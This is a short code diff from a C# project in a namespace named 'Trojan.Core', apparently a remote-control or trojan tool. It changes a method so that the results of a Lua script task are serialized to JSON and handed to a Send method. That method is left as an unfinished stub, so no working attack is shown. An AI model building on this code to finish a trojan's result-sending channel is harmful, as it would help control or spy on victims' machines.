@@ -68,7 +68,8 @@ namespace Cerberus.Presentation.Trojan.Core
             {
                 this._luaTask.Start();
                 object[] result = await this._luaTask;
-                Send();
+                string serialized = JsonConvert.SerializeObject(result);
+                Send(serialized);
                 //Send(JsonConvert.SerializeObject(result));
                 if (this.LoopScript)
                 {
@@ -80,9 +81,11 @@ namespace Cerberus.Presentation.Trojan.Core
 
         }
 
-        public void Send() 
+        public void Send(string serialized) 
         {
             
+            Program.
+
         }
 
         public void Stop()
